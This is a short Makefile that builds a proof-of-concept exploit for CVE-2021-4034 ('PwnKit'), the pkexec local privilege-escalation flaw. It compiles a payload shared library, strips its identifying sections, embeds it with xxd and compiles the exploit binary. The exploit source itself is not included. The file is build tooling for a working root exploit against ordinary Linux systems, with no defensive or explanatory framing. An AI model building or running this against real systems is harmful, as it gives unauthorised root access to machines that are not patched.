define do_strip
strip -R ".jcr"               \
      -R ".comment"           \
      -R ".eh_frame"          \
      -R ".eh_frame_hdr"      \
      -R ".note.gnu.build-id" \
      --strip-debug           \
      --strip-unneeded        $(1)
endef

exploit: FORCE
	gcc pwnkit.c -o pwnkit.so -shared -fPIC
	@$(call do_strip,pwnkit.so)
	xxd -i pwnkit.so >pwnkit.so.inc
	gcc cve-2021-4034-poc.c -o exploit
	@$(call do_strip,exploit)

clean:
	rm -f pwnkit.so pwnkit.so.inc exploit

FORCE:
